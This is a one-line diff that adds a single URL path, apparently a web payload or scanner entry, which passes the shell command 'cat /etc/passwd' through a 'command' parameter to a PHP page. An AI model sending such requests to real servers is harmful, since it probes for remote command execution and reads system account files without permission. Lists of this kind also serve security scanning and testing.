@@ -1,0 +1,1 @@
+/pages/systemcall.php?command=cat%20/etc/passwd
